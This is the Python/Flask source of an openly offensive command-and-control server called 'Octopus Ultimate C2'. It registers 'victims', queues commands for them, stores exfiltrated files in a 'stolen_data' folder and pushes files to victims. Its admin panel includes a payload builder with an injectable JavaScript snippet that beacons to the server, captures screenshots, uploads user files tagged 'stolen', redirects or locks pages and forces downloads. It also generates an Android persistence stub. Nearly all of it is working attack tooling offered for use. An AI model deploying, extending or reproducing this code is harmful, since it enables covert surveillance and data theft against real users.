# -*- coding: utf-8 -*-
"""
==============================================================================
   🐙 OCTOPUS ULTIMATE C2 SERVER v14.0 - FINAL PRODUCTION EDITION
   ----------------------------------------------------------------
   Features:
   - Real-time Web Admin Panel (Dark Theme)
   - Robust SQLite Handling (Concurrency Fixes)
   - Payload Generator (HTML & Android Java)
   - File Manager (Upload & Download from Victims)
   - Send Files to Victims (Silent Download)
   - Live Logs & Screenshot Preview
   
   Author: Octopus Dev
   Target: Railway / Heroku / VPS
==============================================================================
"""

import os
import json
import sqlite3
import base64
import time
import threading
import logging
import shutil
import random
import string
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, send_file, render_template_string, redirect, url_for, abort, Response
from flask_cors import CORS
from flask_socketio import SocketIO, emit

# ==========================================
# 1. SYSTEM CONFIGURATION & SETUP
# ==========================================

# Application Meta
APP_NAME = "Octopus Ultimate C2"
VERSION = "14.0.0"

# Directory Structure
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "octopus_core.db")
LOGS_DIR = os.path.join(BASE_DIR, "system_logs")
UPLOADS_DIR = os.path.join(BASE_DIR, "stolen_data")
DOWNLOADS_DIR = os.path.join(BASE_DIR, "public_downloads") # Files sent TO victim
PAYLOADS_DIR = os.path.join(BASE_DIR, "payloads")

# Ensure ecosystem existence
for directory in [LOGS_DIR, UPLOADS_DIR, DOWNLOADS_DIR, PAYLOADS_DIR]:
    if not os.path.exists(directory):
        try:
            os.makedirs(directory)
            print(f"[INIT] Created directory: {directory}")
        except Exception as e:
            print(f"[ERROR] Could not create directory {directory}: {e}")

# Security (Change this password for production!)
CONTROL_PASSWORD = "admin"  

# Flask Configuration
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(64)
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024 * 1024  # 2GB Max Upload Size
app.config['JSON_SORT_KEYS'] = False

# Enable CORS for all domains (Necessary for C2 operations)
CORS(app, resources={r"/*": {"origins": "*"}})

# SocketIO Setup (Async Mode for Performance)
socketio = SocketIO(
    app, 
    cors_allowed_origins="*", 
    async_mode='threading', 
    ping_timeout=60, 
    ping_interval=25
)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, "server.log")),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("OctopusCore")

# ==========================================
# 2. DATABASE MANAGEMENT LAYER
# ==========================================

class DatabaseManager:
    def __init__(self, db_path):
        self.db_path = db_path
        self._init_db()

    def get_connection(self):
        """Creates a new database connection with high timeout to prevent locking."""
        try:
            # Timeout set to 30 seconds to wait for other threads to finish writing
            conn = sqlite3.connect(self.db_path, timeout=30.0, check_same_thread=False)
            conn.row_factory = sqlite3.Row
            return conn
        except Exception as e:
            logger.error(f"DB Connection Failed: {e}")
            return None

    def _init_db(self):
        """Initializes the database schema."""
        conn = self.get_connection()
        if not conn: return
        try:
            cur = conn.cursor()
            
            # Table: Devices (Victims)
            cur.execute('''
                CREATE TABLE IF NOT EXISTS devices (
                    id TEXT PRIMARY KEY,
                    model TEXT,
                    android_version TEXT,
                    ip_address TEXT,
                    battery_level INTEGER DEFAULT 0,
                    last_seen TIMESTAMP,
                    status TEXT DEFAULT 'offline',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')

            # Table: Commands (Queue)
            cur.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    type TEXT,
                    payload TEXT,
                    status TEXT DEFAULT 'pending',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (device_id) REFERENCES devices (id)
                )
            ''')

            # Table: Files (Logs of uploads)
            cur.execute('''
                CREATE TABLE IF NOT EXISTS files (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    filename TEXT,
                    file_type TEXT,
                    file_size INTEGER,
                    path TEXT,
                    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            logger.info("Database Schema Verified.")
        except Exception as e:
            logger.error(f"DB Init Error: {e}")
        finally:
            conn.close()

    def register_device(self, data, ip_addr):
        """Registers or updates a device in the database."""
        conn = self.get_connection()
        if not conn: return False
        try:
            now = datetime.now().isoformat()
            cur = conn.cursor()
            
            # Upsert Logic (Insert or Update)
            cur.execute('''
                INSERT INTO devices (id, model, android_version, ip_address, battery_level, last_seen, status)
                VALUES (?, ?, ?, ?, ?, ?, 'online')
                ON CONFLICT(id) DO UPDATE SET
                    model=excluded.model,
                    android_version=excluded.android_version,
                    ip_address=excluded.ip_address,
                    battery_level=excluded.battery_level,
                    last_seen=excluded.last_seen,
                    status='online'
            ''', (
                data.get('device_id'),
                data.get('model', 'Unknown Device'),
                data.get('version', 'Unknown OS'),
                ip_addr,
                data.get('battery', 0),
                now
            ))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"Register Device Error: {e}")
            return False
        finally:
            conn.close()

    def update_heartbeat(self, device_id):
        """Updates the last_seen timestamp."""
        conn = self.get_connection()
        if not conn: return
        try:
            now = datetime.now().isoformat()
            conn.execute("UPDATE devices SET last_seen = ?, status = 'online' WHERE id = ?", (now, device_id))
            conn.commit()
        except Exception as e:
            logger.error(f"Heartbeat Update Error: {e}")
        finally:
            conn.close()

    def add_command(self, device_id, cmd_type, payload):
        """Queues a command for a specific device."""
        conn = self.get_connection()
        if not conn: return False
        try:
            conn.execute("INSERT INTO commands (device_id, type, payload) VALUES (?, ?, ?)",
                         (device_id, cmd_type, json.dumps(payload)))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add Command Error: {e}")
            return False
        finally:
            conn.close()

    def get_pending_commands(self, device_id):
        """Fetches pending commands and marks them as sent."""
        conn = self.get_connection()
        if not conn: return []
        try:
            cur = conn.cursor()
            cur.execute("SELECT id, type, payload FROM commands WHERE device_id = ? AND status = 'pending'", (device_id,))
            rows = cur.fetchall()
            
            commands = []
            for row in rows:
                commands.append({
                    "id": row['id'],
                    "type": row['type'],
                    "data": json.loads(row['payload']) if row['payload'] else {}
                })
                # Mark as sent to avoid double execution
                conn.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (row['id'],))
            
            conn.commit()
            return commands
        except Exception as e:
            logger.error(f"Get Commands Error: {e}")
            return []
        finally:
            conn.close()

    def get_all_devices(self):
        """Retrieves all devices sorted by last seen."""
        conn = self.get_connection()
        if not conn: return []
        try:
            cur = conn.cursor()
            cur.execute("SELECT * FROM devices ORDER BY last_seen DESC")
            return [dict(row) for row in cur.fetchall()]
        except Exception as e:
            logger.error(f"Get All Devices Error: {e}")
            return []
        finally:
            conn.close()

    def log_file_upload(self, device_id, filename, file_type, size, path):
        """Logs a file upload event."""
        conn = self.get_connection()
        if not conn: return
        try:
            conn.execute("INSERT INTO files (device_id, filename, file_type, file_size, path) VALUES (?, ?, ?, ?, ?)",
                         (device_id, filename, file_type, size, path))
            conn.commit()
        except Exception as e:
            logger.error(f"Log File Error: {e}")
        finally:
            conn.close()

# Initialize Database Instance
db = DatabaseManager(DB_PATH)

# ==========================================
# 3. BACKGROUND SERVICES (Watchdog)
# ==========================================

def watchdog_service():
    """Background thread to mark silent devices as offline."""
    logger.info("Starting Watchdog Service...")
    while True:
        try:
            time.sleep(60) # Run every 60 seconds
            limit = datetime.now() - timedelta(minutes=2)
            conn = db.get_connection()
            if conn:
                conn.execute("UPDATE devices SET status = 'offline' WHERE last_seen < ?", (limit.isoformat(),))
                conn.commit()
                conn.close()
        except Exception as e:
            logger.error(f"Watchdog Error: {e}")

threading.Thread(target=watchdog_service, daemon=True).start()

# ==========================================
# 4. API ENDPOINTS (Communication Layer)
# ==========================================

@app.route('/control', methods=['GET'])
def health_check():
    """Simple ping endpoint for clients."""
    return jsonify({"status": "active", "server": APP_NAME, "time": int(time.time())}), 200

@app.route('/api/connect', methods=['POST'])
def api_connect():
    """Device Registration."""
    data = request.get_json(silent=True) or {}
    ip = request.remote_addr
    
    if db.register_device(data, ip):
        # Notify Web Admin Panel
        socketio.emit('device_update', {'id': data.get('device_id'), 'status': 'connected'})
        return jsonify({"status": "success"})
    return jsonify({"status": "error"}), 500

@app.route('/api/heartbeat', methods=['POST'])
def api_heartbeat():
    """
    Heartbeat Endpoint.
    Devices poll this to tell server they are alive and to get commands.
    """
    data = request.get_json(silent=True) or {}
    did = data.get('device_id')
    
    if did:
        db.update_heartbeat(did)
        cmds = db.get_pending_commands(did)
        return jsonify({"status": "alive", "commands": cmds})
    
    return jsonify({"status": "error", "message": "Missing device_id"}), 400

@app.route('/api/command', methods=['POST'])
def api_command():
    """Endpoint for Admin to issue commands."""
    data = request.get_json(silent=True) or {}
    did = data.get('device_id')
    ctype = data.get('type')
    payload = data.get('payload', {})
    
    if did and ctype:
        if db.add_command(did, ctype, payload):
            return jsonify({"status": "queued", "device": did, "command": ctype})
    
    return jsonify({"status": "error"}), 400

@app.route('/api/upload', methods=['POST'])
def api_upload():
    """Handles file uploads (Images, stolen files)."""
    try:
        data = request.get_json(silent=True)
        if not data or 'data' not in data:
            return jsonify({"error": "No data provided"}), 400

        did = data.get('device_id', 'Unknown_Device')
        file_type = data.get('type', 'file')
        
        # Decode Base64
        b64_str = data['data']
        if ',' in b64_str:
            b64_str = b64_str.split(',')[1]
        
        try:
            file_bytes = base64.b64decode(b64_str)
        except:
            return jsonify({"error": "Invalid Base64"}), 400

        # Create Filename
        timestamp = int(time.time())
        original_name = data.get('filename', f'upload_{timestamp}.bin')
        
        # Sanitize
        safe_name = f"{file_type}_{did}_{original_name}"
        safe_name = "".join([c for c in safe_name if c.isalpha() or c.isdigit() or c in '._-'])
        
        if 'screenshot' in file_type and not safe_name.endswith('.jpg'):
            safe_name += ".jpg"

        save_path = os.path.join(UPLOADS_DIR, safe_name)
        
        # Write to disk
        with open(save_path, "wb") as f:
            f.write(file_bytes)
            
        # Log to DB
        db.log_file_upload(did, safe_name, file_type, len(file_bytes), save_path)
        
        # Notify Admin Panel
        if 'screenshot' in file_type:
            socketio.emit('new_screenshot', {'url': f'/uploads/{safe_name}', 'device_id': did})
        else:
            socketio.emit('new_file', {'filename': safe_name, 'device_id': did})
            
        logger.info(f"File stored: {safe_name}")
        return jsonify({"status": "success", "url": f"/uploads/{safe_name}"})

    except Exception as e:
        logger.error(f"Upload API Error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/devices_list', methods=['GET'])
def api_devices_list():
    """Returns JSON list of devices (Useful for external python clients)."""
    return jsonify(db.get_all_devices())

@app.route('/api/generate_apk', methods=['POST'])
def api_generate_apk():
    """Mockup for APK Generation."""
    data = request.get_json() or {}
    pkg = data.get('package_name', 'com.sys.update')
    
    java_code = f"""
/* * OCTOPUS ANDROID STUB 
 * Package: {pkg}
 * Server: {request.host_url}
 */
package {pkg};

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainService extends Service {{
    private final String C2_URL = "{request.host_url}api/";
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        new Thread(() -> {{
            while(true) {{
                try {{
                    // HTTP Logic Here to connect to /api/heartbeat
                    Thread.sleep(5000);
                }} catch (Exception e) {{}}
            }}
        }}).start();
        return START_STICKY;
    }}

    @Override
    public IBinder onBind(Intent intent) {{ return null; }}
}}
"""
    return jsonify({"status": "success", "code": java_code})

# --- File Serving Routes ---

@app.route('/uploads/<path:filename>')
def download_uploaded_file(filename):
    return send_file(os.path.join(UPLOADS_DIR, filename))

@app.route('/send/<path:filename>')
def download_public_file(filename):
    """Allows victims to download files from server."""
    return send_file(os.path.join(DOWNLOADS_DIR, filename), as_attachment=True)

@app.route('/upload_to_send', methods=['POST'])
def upload_to_send():
    """Admin endpoint to upload a file to be sent to victims."""
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    
    path = os.path.join(DOWNLOADS_DIR, file.filename)
    file.save(path)
    return jsonify({"status": "success", "filename": file.filename})

# ==========================================
# 5. WEB ADMIN PANEL (The Frontend)
# ==========================================

@app.route('/', methods=['GET'])
@app.route('/admin', methods=['GET'])
def admin_panel():
    # Fetch Data
    devices = db.get_all_devices()
    
    # Stats
    total = len(devices)
    online = len([d for d in devices if d['status'] == 'online'])
    
    # Generate Table Rows
    device_rows = ""
    for d in devices:
        status_color = "success" if d['status'] == 'online' else "secondary"
        last_seen = datetime.fromisoformat(d['last_seen']).strftime('%H:%M:%S') if d['last_seen'] else "Never"
        
        device_rows += f"""
        <tr id="row-{d['id']}">
            <td><span class="badge bg-dark font-monospace">{d['id'][:10]}...</span></td>
            <td>{d['model']}</td>
            <td>{d['android_version']}</td>
            <td>{d['ip_address']}</td>
            <td><span class="badge bg-{status_color}">{d['status'].upper()}</span></td>
            <td>{last_seen}</td>
            <td>
                <div class="btn-group btn-group-sm">
                    <button class="btn btn-outline-primary" onclick="sendCommand('{d['id']}', 'screenshot')"><i class="fas fa-camera"></i></button>
                    <button class="btn btn-outline-warning" onclick="sendCommand('{d['id']}', 'alert')"><i class="fas fa-bell"></i></button>
                    <button class="btn btn-outline-info" onclick="sendCommand('{d['id']}', 'steal_file')"><i class="fas fa-folder-open"></i></button>
                    <button class="btn btn-outline-success" onclick="openSendModal('{d['id']}')"><i class="fas fa-upload"></i></button>
                    <button class="btn btn-outline-danger" onclick="sendCommand('{d['id']}', 'lock')"><i class="fas fa-lock"></i></button>
                </div>
            </td>
        </tr>
        """

    # Get list of downloadable files
    files_to_send = os.listdir(DOWNLOADS_DIR)
    file_options = "".join([f"<option value='{f}'>{f}</option>" for f in files_to_send])

    # HTML Template (Single File Magic)
    html = f"""
    <!DOCTYPE html>
    <html lang="en" data-bs-theme="dark">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{APP_NAME} - Admin</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            body {{ background-color: #0f172a; font-family: 'Segoe UI', sans-serif; }}
            .sidebar {{ height: 100vh; background: #1e293b; border-right: 1px solid #334155; position: fixed; width: 250px; }}
            .main-content {{ margin-left: 250px; padding: 20px; }}
            .card {{ background: #1e293b; border: 1px solid #334155; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
            .table {{ --bs-table-bg: transparent; }}
            .preview-img {{ max-width: 100%; max-height: 500px; border-radius: 8px; border: 2px solid #334155; }}
            .nav-link {{ color: #cbd5e1; }}
            .nav-link:hover, .nav-link.active {{ color: #38bdf8; background: #334155; }}
        </style>
    </head>
    <body>
        
        <div class="sidebar p-3 d-flex flex-column">
            <h3 class="text-success mb-4"><i class="fas fa-spider"></i> OCTOPUS</h3>
            <ul class="nav nav-pills flex-column mb-auto">
                <li class="nav-item"><a href="#" class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-tachometer-alt me-2"></i> Dashboard</a></li>
                <li><a href="#" class="nav-link" onclick="showTab('builder')"><i class="fas fa-tools me-2"></i> Builder</a></li>
                <li><a href="#" class="nav-link" onclick="showTab('files')"><i class="fas fa-file-archive me-2"></i> Files</a></li>
            </ul>
            <div class="mt-auto p-2 bg-black rounded text-center">
                <small class="text-success">● Server Online</small>
            </div>
        </div>

        <div class="main-content">
            
            <div id="dashboard" class="tab-pane">
                <div class="row mb-4">
                    <div class="col-md-3">
                        <div class="card p-3 text-center">
                            <h1>{total}</h1>
                            <span class="text-muted">Total Victims</span>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="card p-3 text-center">
                            <h1 class="text-success">{online}</h1>
                            <span class="text-muted">Online Now</span>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="card p-3">
                            <h5><i class="fas fa-terminal"></i> Global Actions</h5>
                            <button class="btn btn-outline-light btn-sm" onclick="location.reload()">Refresh</button>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-8">
                        <div class="card">
                            <div class="card-header">Connected Devices</div>
                            <div class="table-responsive">
                                <table class="table table-hover align-middle">
                                    <thead>
                                        <tr>
                                            <th>ID</th><th>Model</th><th>OS</th><th>IP</th><th>Status</th><th>Last Seen</th><th>Control</th>
                                        </tr>
                                    </thead>
                                    <tbody id="deviceTableBody">
                                        {device_rows}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">Live Preview</div>
                            <div class="card-body text-center" id="previewContainer">
                                <p class="text-muted mt-5">Waiting for screenshot...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="builder" class="tab-pane d-none">
                <div class="card p-4">
                    <h3><i class="fas fa-hammer"></i> Payload Builder</h3>
                    <hr>
                    <div class="row">
                        <div class="col-md-6">
                            <h5>HTML Injection Payload</h5>
                            <p class="text-muted">Copy this script and inject it into any HTML file.</p>
                            <textarea class="form-control bg-black text-success font-monospace" rows="10" readonly>
&lt;script&gt;
(function() {{
    const SERVER = "{request.host_url}"; 
    let DEV_ID = localStorage.getItem("_oct_uid") || "MOB-" + Math.random().toString(36).substr(2, 8).toUpperCase();
    localStorage.setItem("_oct_uid", DEV_ID);

    if(typeof html2canvas === 'undefined') {{
        let s = document.createElement('script');
        s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        document.head.appendChild(s);
    }}

    async function hb() {{
        try {{
            let r = await fetch(SERVER + "api/heartbeat", {{
                method: "POST", headers: {{"Content-Type": "application/json"}},
                body: JSON.stringify({{device_id: DEV_ID}})
            }});
            let d = await r.json();
            if(d.commands) d.commands.forEach(processCmd);
        }} catch(e) {{}}
    }}

    function processCmd(c) {{
        if(c.type === "alert") alert(c.data.message);
        if(c.type === "redirect") location.href = c.data.url;
        if(c.type === "lock") document.body.innerHTML = "<h1 style='color:red;font-size:10vw;text-align:center;margin-top:40%'>LOCKED</h1>";
        
        if(c.type === "screenshot" && typeof html2canvas !== 'undefined') {{
            html2canvas(document.body).then(cvs => {{
                fetch(SERVER + "api/upload", {{
                    method: "POST", headers: {{"Content-Type": "application/json"}},
                    body: JSON.stringify({{data: cvs.toDataURL("image/jpeg", 0.7), device_id: DEV_ID, type: "screenshot"}})
                }});
            }});
        }}
        
        if(c.type === "steal_file") {{
            let i = document.createElement('input'); i.type = 'file'; i.multiple=true;
            i.onchange = e => {{
                for(let f of e.target.files) {{
                    let r = new FileReader();
                    r.onload = () => {{
                        fetch(SERVER + "api/upload", {{
                            method: "POST", headers: {{"Content-Type": "application/json"}},
                            body: JSON.stringify({{data: r.result.split(',')[1], filename: f.name, device_id: DEV_ID, type: "stolen"}})
                        }});
                    }};
                    r.readAsDataURL(f);
                }}
                alert("Upload Complete");
            }};
            i.click();
        }}
        
        if(c.type === "send_file") {{
            let a = document.createElement('a');
            a.href = c.data.url; a.download = c.data.name; a.style.display='none';
            document.body.appendChild(a); a.click(); document.body.removeChild(a);
        }}
    }}

    fetch(SERVER + "api/connect", {{
        method: "POST", headers: {{"Content-Type": "application/json"}},
        body: JSON.stringify({{device_id: DEV_ID, model: navigator.userAgent}})
    }});

    setInterval(hb, 3000);
}})();
&lt;/script&gt;
                            </textarea>
                        </div>
                    </div>
                </div>
            </div>

            <div id="files" class="tab-pane d-none">
                <div class="row">
                    <div class="col-md-6">
                        <div class="card p-3">
                            <h5>Upload File to Send to Victims</h5>
                            <input type="file" id="adminUpload" class="form-control mb-2">
                            <button class="btn btn-primary" onclick="uploadAdminFile()">Upload to Server</button>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <div class="modal fade" id="sendModal" tabindex="-1">
            <div class="modal-dialog">
                <div class="modal-content bg-dark border-secondary">
                    <div class="modal-header border-secondary">
                        <h5 class="modal-title">Send File to Victim</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body">
                        <input type="hidden" id="modalDeviceId">
                        <label>Select File:</label>
                        <select id="modalFileSelect" class="form-select bg-black text-light mt-2">
                            {file_options}
                        </select>
                    </div>
                    <div class="modal-footer border-secondary">
                        <button type="button" class="btn btn-success" onclick="confirmSendFile()">Send Now</button>
                    </div>
                </div>
            </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
        <script>
            const socket = io();
            const sendModal = new bootstrap.Modal(document.getElementById('sendModal'));

            // Socket Listeners
            socket.on('device_update', () => {{ location.reload(); }});
            
            socket.on('new_screenshot', (data) => {{
                const container = document.getElementById('previewContainer');
                container.innerHTML = `<img src="${{data.url}}?t=${{Date.now()}}" class="preview-img">
                                       <br><small class="text-muted">From: ${{data.device_id}}</small>`;
            }});

            // Tabs Logic
            function showTab(id) {{
                document.querySelectorAll('.tab-pane').forEach(el => el.classList.add('d-none'));
                document.getElementById(id).classList.remove('d-none');
                document.querySelectorAll('.nav-link').forEach(el => el.classList.remove('active'));
                event.target.classList.add('active');
            }}

            // Commands Logic
            function sendCommand(id, type) {{
                let payload = {{}};
                if(type === 'alert') {{
                    const msg = prompt("Enter message:");
                    if(!msg) return;
                    payload = {{message: msg}};
                }}
                if(type === 'redirect') {{
                    const url = prompt("Enter URL:");
                    if(!url) return;
                    payload = {{url: url}};
                }}

                fetch('/api/command', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{device_id: id, type: type, payload: payload}})
                }}).then(r => r.json())
                  .then(d => {{
                      if(d.status === 'queued') alert("Command Sent!");
                      else alert("Error sending command");
                  }});
            }}

            // File Sending Logic
            function openSendModal(id) {{
                document.getElementById('modalDeviceId').value = id;
                sendModal.show();
            }}

            function confirmSendFile() {{
                const id = document.getElementById('modalDeviceId').value;
                const file = document.getElementById('modalFileSelect').value;
                if(!file) return alert("Select a file first");

                const url = window.location.origin + "/send/" + file;
                
                fetch('/api/command', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        device_id: id, 
                        type: 'send_file', 
                        payload: {{url: url, name: file}}
                    }})
                }}).then(r => r.json()).then(d => {{
                    sendModal.hide();
                    alert("File download command sent!");
                }});
            }}

            // Admin Upload Logic
            function uploadAdminFile() {{
                const fileInput = document.getElementById('adminUpload');
                const file = fileInput.files[0];
                if(!file) return alert("Select a file");

                const fd = new FormData();
                fd.append('file', file);

                fetch('/upload_to_send', {{method: 'POST', body: fd}})
                .then(r => r.json())
                .then(d => {{
                    alert("Uploaded! Refreshing...");
                    location.reload();
                }});
            }}
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

# ==========================================
# 6. MAIN EXECUTION
# ==========================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    logger.info(f"STARTING {APP_NAME} v{VERSION} on port {port}")
    # allow_unsafe_werkzeug required for some PaaS deployments
    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
